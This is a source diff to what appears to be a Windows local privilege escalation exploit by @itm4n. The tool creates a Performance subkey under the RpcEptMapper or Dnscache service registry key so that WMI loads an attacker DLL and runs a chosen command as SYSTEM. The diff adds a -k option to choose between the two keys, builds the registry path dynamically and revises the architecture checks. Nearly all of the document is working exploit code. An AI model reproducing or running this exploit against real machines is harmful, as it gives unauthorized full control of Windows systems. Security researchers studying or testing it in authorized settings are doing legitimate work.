@@ -10,10 +10,13 @@
 #pragma comment(lib, "wbemuuid.lib")
 
 #define _WIN32_DCOM
-#define VERSION L"0.1"
+#define VERSION L"0.2"
 #define AUTHOR L"@itm4n"
 #define TIMEOUT 60 // Global timeout value in seconds
-#define PERFORMANCE_REGKEY L"SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper\\Performance"
+//#define PERFORMANCE_REGKEY L"SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper\\Performance"
+#define KEY_SERVICES L"SYSTEM\\CurrentControlSet\\Services"
+#define KEY_RPCEPTMAPPER L"RpcEptMapper"
+#define KEY_DNSCACHE L"Dnscache"
 
 //
 // Command line arguments parsing
@@ -31,6 +34,7 @@ BOOL SetPerformanceRegistryKey(LPCWSTR pwszDllPath, LPCWSTR pwszOpenName, LPCWST
 BOOL UnsetPerformanceRegistryKey();
 DWORD PerformanceDataCollectionThread(LPVOID lpParam);
 DWORD ControlThread(LPVOID lpParam);
+BOOL GetRegistryKeyPath(LPWSTR* ppwszRegKeyPath);
 
 //
 // Misc helpers
@@ -46,6 +50,7 @@ void GetWin32Perf();
 LPWSTR g_pwszCommandLine = NULL;
 BOOL g_bInteractive = FALSE;
 BOOL g_bSpawnOnDesktop = FALSE;
+LPWSTR g_pwszKeyName = NULL;
 
 int wmain(int argc, wchar_t* argv[])
 {
@@ -90,6 +95,19 @@ BOOL ParseArguments(int argc, wchar_t* argv[])
                 bReturnValue = FALSE;
             }
             break;
+        case 'k':
+            ++argv;
+            --argc;
+            if (argc > 1 && argv[1][0] != '-')
+            {
+                g_pwszKeyName = argv[1];
+            }
+            else
+            {
+                wprintf(L"[-] Missing value for option: -k\n");
+                bReturnValue = FALSE;
+            }
+            break;
         default:
             wprintf(L"[!] Invalid option: %ls\n", argv[1]);
             bReturnValue = FALSE;
@@ -106,6 +124,15 @@ BOOL ParseArguments(int argc, wchar_t* argv[])
     {
         wprintf(L"[-] Missing command line argument: -c\n");
         bReturnValue = FALSE;
+    }
+
+    if (g_pwszKeyName)
+    {
+        if (_wcsicmp(g_pwszKeyName, KEY_RPCEPTMAPPER) && _wcsicmp(g_pwszKeyName, KEY_DNSCACHE))
+        {
+            wprintf(L"[-] Key should be '%ws' or '%ws'\n", KEY_RPCEPTMAPPER, KEY_DNSCACHE);
+            bReturnValue = FALSE;
+        }
     }
 
     if (!bReturnValue)
@@ -135,8 +162,10 @@ void PrintUsage()
         "  -c <CMD>  Command - Execute the specified command line\n"
         "  -i        Interactive - Interact with the process (default: non-interactive)\n"
         "  -d        Desktop - Spawn a new process on your desktop (default: hidden)\n"
+        "  -k <KEY>  Key - Either '%ws' or '%ws' (default: '%ws')\n"
         "  -h        Help - That's me :)\n"
-        "\n"
+        "\n",
+        KEY_RPCEPTMAPPER, KEY_DNSCACHE, KEY_RPCEPTMAPPER
     );
 }
 
@@ -254,7 +283,7 @@ BOOL Exploit()
     //
     // Do some cleanup before continuing.
     //
-    (bRegistryKeyCreated = !UnsetPerformanceRegistryKey()) ? wprintf(L"[-] Failed to delete Performance registry key.\n") : wprintf(L"[*] Deleted Performance registry key.\n");
+    (bRegistryKeyCreated = !UnsetPerformanceRegistryKey()) ? wprintf(L"[!] Failed to delete Performance registry key.\n") : wprintf(L"[*] Deleted Performance registry key.\n");
     (bDllCreated = !DeleteFile(pwszDllPath)) ? wprintf(L"[-] Failed to delete Performance DLL.\n") : wprintf(L"[*] Deleted Performance DLL.\n");
 
     //
@@ -409,8 +438,14 @@ BOOL SetPerformanceRegistryKey(LPCWSTR pwszDllPath, LPCWSTR pwszOpenName, LPCWST
     HKEY hPerformanceKey = NULL;
     DWORD dwDisposition = 0;
     LSTATUS status = 0;
+    LPWSTR pwszRegKeyPath = NULL;
 
-    if (ERROR_SUCCESS == (status = RegCreateKeyEx(HKEY_LOCAL_MACHINE, PERFORMANCE_REGKEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hPerformanceKey, &dwDisposition)))
+    if (!GetRegistryKeyPath(&pwszRegKeyPath))
+        return FALSE;
+
+    //wprintf(L"[*] Target key path: %ws\n", pwszRegKeyPath);
+
+    if (ERROR_SUCCESS == (status = RegCreateKeyEx(HKEY_LOCAL_MACHINE, pwszRegKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hPerformanceKey, &dwDisposition)))
     {
         if (REG_CREATED_NEW_KEY == dwDisposition)
         {
@@ -428,12 +463,26 @@ BOOL SetPerformanceRegistryKey(LPCWSTR pwszDllPath, LPCWSTR pwszOpenName, LPCWST
     else
         wprintf(L"[-] RegCreateKeyEx() failed with error code %d.\n", status);
 
+    LocalFree(pwszRegKeyPath);
+
     return bReturnValue;
 }
 
 BOOL UnsetPerformanceRegistryKey()
 {
-    return ERROR_SUCCESS == RegDeleteKey(HKEY_LOCAL_MACHINE, PERFORMANCE_REGKEY);
+    BOOL bSuccess = FALSE;
+    LPWSTR pwszRegKeyPath = NULL;
+
+    if (!GetRegistryKeyPath(&pwszRegKeyPath))
+        return FALSE;
+
+    //wprintf(L"[*] Target key path: %ws\n", pwszRegKeyPath);
+
+    bSuccess = RegDeleteKey(HKEY_LOCAL_MACHINE, pwszRegKeyPath);
+
+    LocalFree(pwszRegKeyPath);
+
+    return bSuccess;
 }
 
 DWORD PerformanceDataCollectionThread(LPVOID lpParam)
@@ -628,14 +677,35 @@ cleanup:
 
 BOOL CheckRequirements()
 {
+#if _WIN64
+    return TRUE;
+#elif _WIN32
     SYSTEM_INFO sysinfo = { 0 };
 
     GetNativeSystemInfo(&sysinfo);
 
-    if (PROCESSOR_ARCHITECTURE_AMD64 == sysinfo.wProcessorArchitecture)
+    if (sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
+    {
+        wprintf(L"[-] Please use the 64-bit version instead.\n");
+        return FALSE;
+    }
+#endif
+
+    wprintf(L"[-] This system architecture is not supported.\n");
+
+    return FALSE;
+}
+
+BOOL GetRegistryKeyPath(LPWSTR* ppwszRegKeyPath)
+{
+    LPWSTR pwszRegKeyPath = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+
+    if (pwszRegKeyPath)
+    {
+        StringCchPrintf(pwszRegKeyPath, MAX_PATH, L"SYSTEM\\CurrentControlSet\\Services\\%ws\\Performance", g_pwszKeyName ? g_pwszKeyName : KEY_RPCEPTMAPPER);
+        *ppwszRegKeyPath = pwszRegKeyPath;
         return TRUE;
-    else
-        wprintf(L"[-] This system architecture is not supported.\n");
+    }
 
     return FALSE;
 }
